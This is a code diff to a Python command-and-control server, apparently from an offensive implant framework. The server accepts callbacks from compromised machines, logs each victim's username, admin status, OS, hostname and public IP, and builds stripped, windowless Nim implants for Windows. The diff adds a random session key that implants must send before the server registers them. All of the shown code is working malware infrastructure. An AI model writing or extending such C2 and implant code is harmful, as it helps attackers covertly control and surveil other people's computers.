@@ -18,6 +18,7 @@ import re
 import atexit
 from rich import print
 from rich.progress import track
+import secrets
 
 def banner():
     print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
@@ -135,36 +136,41 @@ def comm_handler():
             break
         try:
             remote_target, remote_ip = sock.accept()
-            username = remote_target.recv(4096).decode()
-            username = base64.b64decode(username).decode()
-            admin = remote_target.recv(4096).decode()
-            admin = base64.b64decode(admin).decode()
-            operating_system = remote_target.recv(4096).decode()
-            operating_system = base64.b64decode(operating_system).decode()
-            host_name = remote_target.recv(4096).decode()
-            host_name = base64.b64decode(host_name).decode()
-            public_ip = remote_target.recv(4096).decode()
-            public_ip = base64.b64decode(public_ip).decode()
-            if admin == 1:
-                admin_value = 'Yes'
-            elif username == 'root':
-                admin_value = 'Yes'
+            key_validation = remote_target.recv(4096).decode()
+            key_validation = base64.b64decode(key_validation).decode()
+            if key_validation == auth_key:
+                username = remote_target.recv(4096).decode()
+                username = base64.b64decode(username).decode()
+                admin = remote_target.recv(4096).decode()
+                admin = base64.b64decode(admin).decode()
+                operating_system = remote_target.recv(4096).decode()
+                operating_system = base64.b64decode(operating_system).decode()
+                host_name = remote_target.recv(4096).decode()
+                host_name = base64.b64decode(host_name).decode()
+                public_ip = remote_target.recv(4096).decode()
+                public_ip = base64.b64decode(public_ip).decode()
+                if admin == 1:
+                    admin_value = 'Yes'
+                elif username == 'root':
+                    admin_value = 'Yes'
+                else:
+                    admin_value = 'No'
+                if 'windows' in operating_system:
+                    pay_val = 1
+                else:
+                    pay_val = 2
+                cur_time = time.strftime("%H:%M:%S",time.localtime())
+                date = datetime.now()
+                time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
+                
+                if host_name is not None:
+                    targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
+                    print(f'[+] Callback recieved from {host_name}@{public_ip}\n' + 'Enter command#> ', end="")
+                else: 
+                    targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
+                    print(f'[+] Callback recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")
             else:
-                admin_value = 'No'
-            if 'windows' in operating_system:
-                pay_val = 1
-            else:
-                pay_val = 2
-            cur_time = time.strftime("%H:%M:%S",time.localtime())
-            date = datetime.now()
-            time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
-            
-            if host_name is not None:
-                targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
-                print(f'[+] Callback recieved from {host_name}@{public_ip}\n' + 'Enter command#> ', end="")
-            else: 
-                targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
-                print(f'[+] Callback recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")  
+                remote_target.close()
         except:
             pass
 
@@ -201,6 +207,11 @@ def nimplant():
         patch_port = f.read().replace('INPUT_PORT', str(host_port))
     with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(patch_port)
+        f.close()
+    with open(f'{implant_loc}/{f_name}') as f:
+        new_key = f.read().replace('AUTH_KEY', auth_key)
+    with open(f'{implant_loc}/{f_name}', 'w') as f:
+        f.write(new_key)
         f.close()
     compile_cmd = [f"nim", "c", "-d:mingw", "-d:release", "--app:gui", "-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
     for _ in track(range(8), description=f'[green][*] Compiling executeable {exe_file}...'):
@@ -362,6 +373,11 @@ if __name__ == '__main__':
             print("[+] Creating Payloads Directory...")
             os.mkdir('Payloads')
     
+    length_gen = secrets.SystemRandom()
+    key_length = length_gen.randint(12,33)
+    auth_key = (''.join(secrets.token_urlsafe(key_length)))
+    print(f'[+] Key for this session is {auth_key}')
+
 
     while True:
         try:
